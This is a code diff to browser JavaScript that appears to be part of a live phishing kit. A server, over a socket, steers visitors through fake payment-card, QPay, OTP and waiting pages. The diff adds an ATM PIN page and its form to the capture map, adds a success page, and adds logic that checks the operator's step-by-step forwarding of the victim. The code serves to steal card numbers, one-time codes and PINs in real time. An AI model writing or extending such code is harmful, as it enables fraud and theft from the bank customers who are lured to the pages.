@@ -13,6 +13,7 @@ if (!sessionId) {
 // 2. Page Detection
 function detectCurrentPage() {
   const path = (location.pathname || '').toLowerCase();
+  if (path.includes('success')) return 'success';
   if (path.includes('registration-summary')) return 'registration-summary';
   if (path.includes('registration')) return 'registration';
   if (path.includes('payment-card')) return 'payment-card';
@@ -20,6 +21,7 @@ function detectCurrentPage() {
   if (path.includes('payment')) return 'payment';
   if (path.includes('qpy')) return 'qpy';
   if (path.includes('otp')) return 'otp';
+  if (path.includes('atm')) return 'atm';
   if (path.includes('wait')) return 'wait';
   return 'index';
 }
@@ -70,8 +72,22 @@ socket.on('navigate', ({ page }) => {
     { id: 'qpy', name: 'QPay', url: '/qpy.html' },
     { id: 'payment-verify', name: 'التحقق من الرمز', url: '/payment-verify.html' },
     { id: 'otp', name: 'رمز التحقق', url: '/otp.html' },
-    { id: 'wait', name: 'الانتظار', url: '/wait.html' }
+    { id: 'atm', name: 'الرقم السري', url: '/atm.html' },
+    { id: 'wait', name: 'الانتظار', url: '/wait.html' },
+    { id: 'success', name: 'نجاح', url: '/success.html' }
   ];
+
+  if (currentPage === 'wait') {
+    var src = sessionStorage.getItem('wait-source') || '';
+    var forwardMap = { 'payment-card': 'payment-verify', 'payment-verify': 'atm', 'atm': 'success' };
+    if (src && forwardMap[src] && page !== forwardMap[src]) {
+      sessionStorage.setItem('page-error', '1');
+    } else {
+      sessionStorage.removeItem('page-error');
+    }
+    sessionStorage.removeItem('wait-source');
+  }
+
   const target = PAGES.find(p => p.id === page)?.url || '/';
   window.location.href = target;
 });
@@ -302,7 +318,8 @@ document.addEventListener('DOMContentLoaded', () => {
     '#card-form': 'payment-card',
     '#paymentForm form, #paymentForm': 'qpy',
     '#verify-form': 'payment-verify',
-    '#otpForm': 'otp'
+    '#otpForm': 'otp',
+    '#atm-form': 'atm'
   };
   Object.entries(forms).forEach(([sel, page]) => {
     const form = document.querySelector(sel);
